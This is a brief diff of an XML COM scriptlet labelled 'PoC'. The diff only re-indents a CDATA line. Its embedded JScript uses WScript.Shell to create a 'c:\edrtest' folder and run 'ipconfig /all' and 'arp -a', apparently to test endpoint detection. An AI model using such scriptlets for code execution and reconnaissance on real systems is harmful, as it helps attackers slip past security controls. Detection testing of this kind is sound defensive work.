@@ -4,7 +4,7 @@
     progid="PoC"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 	<script language="JScript">
-		<![CDATA[
+	<![CDATA[
 var r = new ActiveXObject("WScript.Shell").Run("cmd /c mkdir c:\\edrtest");
 var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all");
 var r = new ActiveXObject("WScript.Shell").Run("arp -a");
